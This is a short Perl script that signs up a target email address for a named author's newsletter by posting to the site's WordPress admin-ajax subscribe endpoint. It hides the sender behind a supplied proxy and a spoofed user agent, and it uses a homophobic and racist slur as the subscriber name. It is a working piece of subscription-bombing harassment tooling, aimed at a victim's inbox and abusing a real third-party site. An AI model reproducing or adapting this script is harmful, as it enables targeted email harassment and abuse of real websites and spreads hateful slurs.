#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;

my $target = shift;
my $proxy = shift;
my $user_agent = shift;
# Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:55.0) Gecko/20100101 Firefox/55.0

my $ua = LWP::UserAgent->new;
my $cookie_jar = HTTP::Cookies->new;
        $ua->timeout(5);
        $ua->agent($user_agent);
        $ua->cookie_jar($cookie_jar);
        $ua->proxy(https => 'http://'.$proxy);

# https://annhandley.com/newsletter/

my $get_signup_page = $ua->get('https://annhandley.com/newsletter/');
        my $signup_page_string = $get_signup_page->as_string;

my $signup = $ua->post(
        'https://annhandley.com/ah/wp-admin/admin-ajax.php',
        Content_Type => 'application/x-www-form-urlencoded',
        Accept => '*/*',
        Content =>
        [
        'action' => 'fl_builder_subscribe_form_submit',
        'name' => 'GayNiggerAssociationOfAmerica',
        'email' => $target,
        'terms_checked' => '0',
        'post_id' => '3763',
        'node_id' => '5a43c16a48e54'
        ]
        );


